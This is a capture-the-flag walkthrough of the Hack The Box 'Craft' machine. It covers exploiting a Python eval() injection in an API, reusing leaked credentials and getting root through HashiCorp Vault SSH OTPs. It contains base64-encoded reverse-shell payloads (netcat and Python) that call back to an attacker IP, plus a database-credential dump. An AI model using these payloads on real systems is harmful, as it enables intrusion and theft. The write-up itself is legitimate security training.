# Craft Writeup - by Thammanant Thamtaranon

**Craft** is a medium-difficulty Linux-based machine hosted on Hack The Box.

## Reconnaissance
- I began with a full TCP port scan, including service/version detection and OS fingerprinting:
  `nmap -A -T4 -p- 10.10.10.110`
  ![Nmap_Scan](Nmap_Scan.png)
- The scan revealed the following open ports:
  - **22** — SSH
  - **443** — HTTPS
  -  **6022** — Golang x/crypto/ssh server
- I added `craft.htb` to `/etc/hosts` for proper hostname resolution.

## Scanning & Enumeration
- Visiting https and reading the response from Burp Suite founded additional Vhost name including `api.craft.htb` and `gogs.craft.htb`. We add those to `/etc/hosts`.
  ![Response](Response.png)
- Visiting `api.craft.htb` found swagger API. Unfortuantly we need credentials to use this API.
  ![Swagger](Swagger.png)
- Visiting `gogs.craft.htb` found craft repository.
  ![Gogs](Gogs.png)
- In the issues tab we found user `Dinesh Chugtai` JWT token.
  ![Invalid_JWT_Token](Invalid_JWT_Token.png)
- Putting this token in `jwt.io` show that the token is already expired.
  ![Expired](Expired.png)

## Exploitation
- After cloning the repository, we discover that the database is MySQL, the python framework is Flask and in `.gitignore` have a file name `settings.py`. We will note that down for may or maynot be later use.
- Inspecting through repository python file we found a vulnerable code in `brew.py`. The code us `eval()`, The `eval()` function in Python takes a string and executes it as valid Python code.
  ![Vuln1](Vuln1.png)
  ![Vuln2](Vuln2.png)
- We run the command `git log -p` and found user `dinesh` credential.
  ![Credential](Credential.png)
- We then went back to `swagger` and login as user dinesh, obtaining Token.
  ![Valid_JWT_Token](Valid_JWT_Token.png)
- So we now got the token and we know that the parameter `abv` use `eval()` so we need to craft the payload. we try send the encoded payload `"__import__('os').system('echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTYuNCA0NDQ0ID4vdG1wL2YK | base64 -d | bash')"`
  ![RCE_bash](RCE_bash.png)
- But failed, we got "ABV must be a decimal value less than 1.0". this means that the it crashed, likely of not having `bash`, so we will try `sh`.
`"__import__('os').system('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjEwLjE2LjQnLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcsJy1pJ10pOwo= | base64 -d | python3')"`
  ![RCE_sh](RCE_sh.png)
- It worked, we got in as root. However, I think we are inside a container.
  ![RCE](RCE.png)
- In `/opt/app/craft_api` we read the file `settings.py` and found MySQL credential.
  ![MySQL](MySQL.png)
- We the try to connect to MySQL but there is not `mysql` binary so we run `python3 -c 'import pymysql; conn=pymysql.connect(host="db", user="craft", password="qLGockJ6G2J75O", db="craft"); c=conn.cursor(); c.execute("SELECT * FROM user"); print(c.fetchall())`
- We then found serveral user credentials.
  ![Credentials](Credentials.png)
- I try ssh into the machine and failed so I use these credentials to login at `gogs.craft.htb` and we got in using `gilfoyle:ZEU3N8WNM2rh4T`.
  ![Gilfoyle_Account](Gilfoyle_Accunt.png)
- We found Gilfoyle private repository named `craft-infra`.
  ![Craft_Infra](Craft_Infra.png)
- Inside `.ssh` folder we found public and private ssh key.
  ![SSH_Key](SSH_Key.png)
- We download the `id_rsa` and try connect to the machine using ssh. We got in using the passphrase `ZEU3N8WNM2rh4T`.
  ![Gilfoyle](Gilfoyle.png)
- We then capture the user flag.

## Privilege Escalation
- Running `sudo -l` command show that there is not sudo binary on this machine.
- In the user `gilfoyle` home we found `.vault-token`. Recalling user `gilfoyle` private repository, there is a file name vault. This is likely `HashiCorp Vault`. `HashiCorp Vault` is a tool used to keep secrets (passwords, API keys, certificates) safe. Instead of developers hardcoding passwords into their scripts, they are supposed to ask Vault for them when needed
- From the `secrets.sh` in vault folder we saw `vault secrets enable ssh` and `default_user=root`. This means the vault is able to generate OTP as user root for us.
- The Vault Token is a session credential (like a web cookie) that proves identity. The `.vault-token` file is simply where the client stores this token so the user doesn't have to re-authenticate for every command. So we use this token to login to the vault.
- Reading `/etc/hosts` discover vault ip.
  ![Vault_IP](Vault_IP.png)
- The we run the command `vault write -tls-skip-verify ssh/creds/root_otp ip=10.10.10.110`. This command ask vault to generate OTP key for the default role, which is `root_otp` (root) based on `ssh/roles/root_otp` inside `secrets.sh`.
  ![Root_Key](Root_Key.png)
- Then we copy the key field and ssh onto the mahine using user root and key as a password.
- We then capture the root flag.
  ![Vault_IP](Vault_IP.png)
